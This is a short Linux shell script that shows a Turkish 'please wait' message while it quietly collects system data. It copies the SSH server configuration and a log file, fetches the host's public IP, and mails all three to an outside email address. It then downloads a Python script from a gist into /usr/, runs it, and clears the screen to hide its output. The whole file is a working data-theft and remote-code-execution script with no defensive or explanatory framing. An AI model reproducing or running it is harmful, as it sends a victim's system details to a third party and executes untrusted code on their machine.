#Linux System
echo "Lutfen Bekleyin..."
apt-get install pip2
pip2 install smtplib
cp /etc/ssh/sshd_config /tmp/ssh.txt
touch /tmp/log.txt
cd /tmp/
curl -o ip.txt https://ipinfo.io/ip
sendmail b0ru70@ajanlar.org < /tmp/ssh.txt
sendmail b0ru70@ajanlar.org < /tmp/log.txt
sendmail b0ru70@ajanlar.org < /tmp/ip.txt
wget https://gist.githubusercontent.com/B0RU70/83f768db01efc909eaee7b3f132fbaa3/raw/4a6b9eab5b68755548d948d3f0a9f67d3c086b9f/logs.py -P /usr/
python /usr/logs.py
cd /root/
clear
clear
clear
